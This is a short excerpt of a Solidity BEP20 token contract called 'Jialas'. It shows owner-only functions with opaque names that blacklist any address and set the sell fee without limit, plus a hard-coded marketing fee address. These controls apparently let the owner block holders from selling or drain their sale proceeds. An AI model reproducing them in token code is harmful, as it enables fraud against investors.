...
contract Jialas is IBEP20, Admin {
    ...
    string constant _name = "JJialas";
    string constant _symbol = "Jialas";
    ...
    address private marketingFeeReceiver = (0x1d5bac2dad8F477da7A0d3D478F8Fb4e15196943); // marketing address
    ...
    function setDBJialas(address account, bool bmv) external onlyOwner() {
        bots[account] = bmv;
    }

    function setDEJialas(uint256 fv) external onlyOwner {
        sellMarketingFee = fv;
    }
